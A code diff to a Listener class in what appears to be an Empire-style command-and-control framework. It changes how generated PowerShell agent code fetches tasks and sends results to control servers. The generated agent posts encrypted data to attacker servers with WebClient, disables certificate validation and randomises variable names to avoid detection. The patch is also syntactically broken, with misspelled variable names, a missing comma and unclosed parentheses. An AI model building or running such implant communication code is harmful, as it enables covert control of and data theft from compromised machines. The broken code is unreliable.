@@ -688,8 +688,9 @@ class Listener:
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('#LISTENER_DICT', commsCode[0])
-            code = code.replace('#COMM_FUNCTION', commsCode[1])
+            code = code.replace('#LISTENER_DICT', commsCode[0])\
+                   .replace('#COMM_FUNCTION', commsCode[1])\
+                   .replace('#TASK_FUNCTION',commsCode[2])
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -784,7 +785,20 @@ class Listener:
     "defaultResponse"={defaultResponse}
 }},
 #LISTENER_DICT
-"""
+""".format(
+           get_task_func = "get_task_{}".format(listeoerOptions['Name']['Value'])
+           send_func = "send_message_{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           listLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'],
+           cookie = self.options['Cookie']['Value'],
+           taskURIs = profile.split('|')[0])
+
                 updateServers = """
                     $Script:ControlServers = @("%s");
                     $Script:ServerIndex = 0;
@@ -794,7 +808,7 @@ class Listener:
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 getTask = """
-                    $script:GetTask = {
+                    $script:get_task_{{name}} = {
                         param($FixedParameters)
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
@@ -836,7 +850,10 @@ class Listener:
 
                 sendMessage = """
                     $script:SendMessage = {
-                        param($Packets)
+                        param($Packets,$FixedParameters)
+
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
 
                         if($Packets) {
                             # build and encrypt the response packet
@@ -846,23 +863,23 @@ class Listener:
                             # meta 'RESULT_POST' : 5
                             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
 
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+                            if($ControlServers[$ServerIndex].StartsWith('http')) {
                                 # build the web request object
                                 $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                 if($Script:Proxy) {
-                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
+                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $FixedParameters["Proxy"];
                                 }
 
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $FixedParameters["UserAgent"])
+                                $FixedParameters["headers"].GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
                                 try {
                                     # get a random posting URI
-                                    $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $taskURI = $FixedParameters["taskURIs"] | Get-Random
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($ControlServers[$ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
@@ -876,7 +893,9 @@ class Listener:
                     }
                 """
 
-                return updateServers + getTask + sendMessage
+                return (listener_dict.format(
+                        getTask.format(ControlServers = updateServers),
+                        sendMessage.format(ControlServers = updateServers)
 
             elif language.lower() == 'python':
 
